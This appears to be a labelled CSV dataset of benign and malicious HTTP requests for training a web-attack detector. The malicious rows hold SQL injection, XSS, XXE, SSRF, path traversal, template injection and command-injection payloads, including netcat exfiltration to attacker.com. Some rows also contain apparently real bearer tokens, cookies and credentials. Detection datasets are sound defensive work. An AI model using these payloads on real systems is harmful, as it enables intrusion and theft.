method,path,query,headers,body,ua,label
DELETE,/login,,Host: example.com; Accept: */*,input=' OR 1=1--,curl/7.68.0,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,php://input,,,1
GET,/,,`uname -a`,,,1
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET /auth/google/callback,,,0
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,GET /sitemap.xml,,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,GET /static/css/style.css,,,0
GET,/,,admin*)(| (password=*)),,,1
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/favicon.ico,,,,,0
POST,/checkout,,Host: example.com; Accept: */*,username=user249&password=pass553,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,//////////////////etc/passwd,,,1
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
PUT,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,http://127.0.0.1:22,,,1
GET,/api/channels/CH1003/products/ID129041/attributes,,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: en,vi-vn;q=0.9,vi-VN;q=0.8,vi;q=0.7,en-US;q=0.6; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJmdWxsbmFtZSI6Ik5HVVnhu4ROIFBISSBUUsav4bucTkciLCJwaG9uZSI6IjAzNzk4NzY5MzkiLCJzY2hhbm5lbCI6Ijk3MDQzMCIsInVzZXItaWQiOiJhZThkMjlmMy1iZTA0LTQ2OGEtYTc5ZS02NTZiMzA2MzVlNGEiLCJzdWIiOiI5NzA0MzBAMDM3OTg3NjkzOSIsImlhdCI6MTc3MTY0NDM2MCwiZXhwIjoxNzcxNzMwNzYwfQ.C86xx1elBOKqLhJawAmKHBnuy2RTZZthSzN-4Q5-NIQ; Cache-Control: no-cache; Connection: keep-alive; Content-Type: application/json; Cookie: _gcl_au=1.1.1050590432.1771644361; _ga=GA1.1.2015085749.1771644361; _tt_enable_cookie=1; _ttp=01KHZ3Q72CG5ZWX4JBRA44012K_.tt.1; _fbp=fb.1.1771644364920.853969712404590901; _ga_1XRVJ9DDS6=GS2.1.s1771644361$o1$g1$t1771644402$j19$l0$h0; ttcsid_CQNEHUJC77UD2I8MDM90=1771644361917::Be7EZ9L2Fm4FN0gv5VoF.1.1771644410560.1; ttcsid_CQQA2PJC77U11VCBE7G0=1771644361931::mihI4ztRz1koglPjYSYP.1.1771644410566.1; ttcsid=1771644361925::Rw9cC01r_YNsKyCgzIIj.1.1771644410567.0; Host: sacombankpay.vnshop.vn; Pragma: no-cache; Referer: https://sacombankpay.vnshop.vn/products/thietbibluetoothsamsungsm-l330-44-xam-ID129041?sku-route-history=homePage_LISTING_TAB; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Android WebView"";v=""144""; Sec-Ch-Ua-Mobile: ?1; Sec-Ch-Ua-Platform: ""Android""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Dalvik/2.1.0 (Linux; U; Android 15; SM-A245N Build/AP3A.240905.015.A2); X-Request-Id: 99b5c754-814c-4035-b0ac-8d1faea13a39; X-Requested-With: com.sacombank.ewallet",,Dalvik/2.1.0 (Linux; U; Android 15; SM-A245N Build/AP3A.240905.015.A2),0
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,id=1' OR '1'='1,,,1
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
DELETE,/login,,Host: example.com; Accept: */*,input=' OR 1=1--,Nikto/2.1.6,1
GET,/,,|| ls -la,,,1
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,GET /images/logo.png,,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,POST /register (detailed user info),,,0
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,POST /api/v1/orders (JSON payload),,,0
DELETE,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,GET /static/css/style.css,,,0
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/favicon.ico,,,,,0
POST,/search,,Host: example.com; Accept: */*,input=' OR 'x'='x,curl/7.68.0,1
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,GET /manifest.json,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,GET /api/v1/products,,,0
GET,/,,http://127.0.0.1:22,,,1
GET,/,,url=http://malicious.com,,,1
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,Host: evil.com,,,1
GET,/,,GET /api/v1/products,,,0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,GET /api/v1/products/101,,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,url=http://malicious.com,,,1
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/favicon.ico,,,,,0
GET,/favicon.ico,,,,,0
GET,/,,(&(uid=admin)(|(password=*))),,,1
POST,/login,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,Nikto/2.1.6,1
GET,/wp-content/plugins/wp-ecommerce-shop-styling/includes/dompdf/dompdf.php,input_file=php://filter/resource=/etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15",1
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,GET /health,,,0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/web-api/orders/1e62adeb-22bb-40de-aafb-7d4934c04940,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzQ1NTg2MTYiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiNjU1ZWU5MmItNTViMi00NzQyLWEyOTktMDU4Njk4OWVkMmUyIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzQ1NTg2MTYiLCJzdWIiOiJXRUJTSVRFQDA3NzQ1NTg2MTYiLCJpYXQiOjE3NzA2MzAyMTUsImV4cCI6MTc3MTIzNTAxNX0.2c6b4mC1rDQkFa9kxT6vFDhEC0h0WWW6oW-4Uue_AoM; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 2edc8b81-55bd-4d2c-ad74-9898ab33dfc7",,python-requests/2.32.5,0
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,`uname -a`,,,1
GET,/,,GET /feed/news.rss,,,0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,POST /blog/comment (valid user text),,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,username=user43&password=pass408,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/phpPgAdmin/index.php,_language=../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/favicon.ico,,,,,0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,GET /favicon.ico,,,0
GET,/,,id=1&id=2,,,1
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,Nmap Scripting Engine,1
GET,/index.php,option=com_ultimateportfolio&controller=../../../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46",1
GET,/,,url=http://malicious.com,,,1
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,GET /static/css/style.css,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /docs/api/introduction,,,0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,; cat /etc/passwd,,,1
GET,/,,GET /feed/news.rss,,,0
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/favicon.ico,,,,,0
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/CuteSoft_Client/CuteEditor/Template.aspx,"Referrer=XSS"";><script>alert(document.domain)</script>","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.6.21",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.6.21",1
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,GET /config/app-settings.json,,,0
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,GET /api/v1/ping,,,0
PUT,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,${os.system('id')},,,1
GET,/,,../../../../etc/passwd,,,1
GET,/,,GET /api/v1/ping,,,0
GET,/,,%0als,,,1
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,../../../../etc/passwd,,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /,,,0
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,javascript:alert(1),,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=' OR 1=1--,curl/7.68.0,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,curl/7.68.0,1
POST,/profile,,Host: example.com; Accept: */*,username=user830&password=pass3,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /feed/news.rss,,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/favicon.ico,,,,,0
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,expect://id,,,1
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
POST,/profile,,Host: example.com; Accept: */*,username=user164&password=pass949,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/favicon.ico,,,,,0
GET,/favicon.ico,,,,,0
GET,/favicon.ico,,,,,0
PUT,/admin,,Host: example.com; Accept: */*,input=' OR 'x'='x,Nmap Scripting Engine,1
GET,/,,javascript:alert(1),,,1
POST,/api/v1/orders,,Host: example.com; Accept: */*,username=user893&password=pass967,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/favicon.ico,,,,,0
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,GET /search?q=C%23,,,0
GET,/,,GET /login,,,0
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/getCorsFile,urlPath=file:///etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,GET /feed/news.rss,,,0
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,GET /feed/news.rss,,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,${os.system('id')},,,1
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/favicon.ico,,,,,0
GET,/,,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,GET /images/logo.png,,,0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,|| ls -la,,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
POST,/search,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nmap Scripting Engine,1
GET,/maint/modules/home/index.php,lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00english,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8; Accept-Encoding: gzip; Accept-Language: en-US,en;q=0.5; Authorization: Basic bWFpbnQ6cGFzc3dvcmQ=; Connection: close; Cookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2; Host: atp.vnpay.vn; Referer: atp.vnpay.vn/maint/index.php?packages; User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:48.0) Gecko/20100101 Firefox/48.0",,Mozilla/5.0 (Windows NT 5.1; rv:48.0) Gecko/20100101 Firefox/48.0,1
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,GET /docs/api/introduction,,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,`uname -a`,,,1
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
PUT,/index.php,,Host: example.com; Accept: */*,input=' OR 1=1--,sqlmap/1.5.2,1
PUT,/search,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nikto/2.1.6,1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,admin*)(| (password=*)),,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=| cat /etc/passwd,sqlmap/1.5.2,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
